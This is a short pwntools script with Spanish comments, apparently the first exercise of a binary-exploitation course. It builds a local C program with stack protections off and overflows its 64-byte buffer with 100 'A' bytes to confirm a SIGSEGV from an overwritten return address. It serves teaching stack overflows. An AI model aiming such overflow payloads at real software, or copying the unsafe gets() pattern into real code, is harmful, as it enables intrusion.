#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A1 - Primer crash: 100 letras 'A' sobre char[64] -> SIGSEGV.
USO: python3 a1_crash.py"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

BIN = './a1_crash'

compile_cmd = ['gcc', '-g', '-O0', '-fno-stack-protector', '-no-pie',
               '-o', BIN, 'a1_crash.c']
log.info('Compilando: %s', ' '.join(compile_cmd))
process(compile_cmd).wait()

elf = ELF(BIN, checksec=False)   # simbolos dinamicos: nada hardcodeado

io = process(BIN)
io.recvuntil(b'alimentame con 100 letras')   # sincronizar con el banner

# Payload: 100 'A' (0x41). buffer[64] aguanta 64; los 36 restantes pisian
# RBP guardado (8), direccion de retorno (8) y stack superior.
payload = b'A' * 100
log.info('Enviando payload de %d bytes (%d de overflow legal)',
         len(payload), len(payload) - 64)
io.sendline(payload)             # sendline agrega el \n que gets() espera

io.wait()                        # esperar a que el proceso muera
io.close()

# Si el sistema reporta SIGSEGV, el overflow llego al retorno.
if io.poll() == -signal.SIGSEGV:
    log.success('A1 SUPERADO: SIGSEGV confirmado (exit code %d)', io.poll())
    log.info('Interpretacion: ret consumio 0x4141414141414141 y la MMU aborto.')
else:
    log.failure('A1: el proceso salio con %s; revisa las flags.', io.poll())
